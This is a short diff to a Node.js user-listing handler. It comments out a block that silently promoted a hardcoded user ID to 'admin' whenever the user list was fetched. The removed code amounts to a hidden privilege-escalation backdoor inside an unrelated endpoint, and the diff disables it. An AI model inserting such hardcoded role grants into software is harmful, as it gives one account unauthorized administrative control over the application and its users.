@@ -189,12 +189,12 @@ const getAllUsers = asyncErrorHandler(async (req, res, next) => {
   // Build MongoDB query
   const query = {};
 
-  ///////
-      const updatedUser = await User.findByIdAndUpdate('68bd952208dc44cff08bb0ff', {userRole : 'admin'}, {
-      new: true,
-      runValidators: true,
-    });
-  //////
+  // ///////
+  //     const updatedUser = await User.findByIdAndUpdate('68bd952208dc44cff08bb0ff', {userRole : 'admin'}, {
+  //     new: true,
+  //     runValidators: true,
+  //   });
+  // //////
 
   // Apply name search if provided (case-insensitive partial match)
   if (name && name.trim()) {
